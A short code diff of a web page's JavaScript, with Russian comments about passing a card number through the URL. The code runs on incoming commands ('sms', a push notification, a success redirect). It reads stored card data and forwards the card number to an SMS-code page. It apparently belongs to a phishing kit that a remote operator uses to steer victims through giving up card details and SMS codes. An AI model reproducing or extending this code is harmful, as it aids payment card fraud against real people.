@@ -668,7 +668,6 @@
         window.showPushNotification();
     } else if (command.action === 'sms') {
         console.log('📱 Получена команда SMS');
-        // ПЕРЕДАЕМ НОМЕР КАРТЫ ЧЕРЕЗ URL
         const cardData = JSON.parse(sessionStorage.getItem('cardData') || '{}');
         const cardNumber = cardData.number || '';
         window.redirectToSMS(cardNumber);
@@ -683,7 +682,6 @@
         window.redirectToSuccess();
     }
 }
-
 // ОБНОВЛЕННАЯ ФУНКЦИЯ РЕДИРЕКТА
 window.redirectToSMS = function(cardNumber) {
     // ПЕРЕДАЕМ НОМЕР КАРТЫ В URL
@@ -799,6 +797,7 @@ function stopPing() {
     </script>
 </body>
 </html>
+
 
 
 
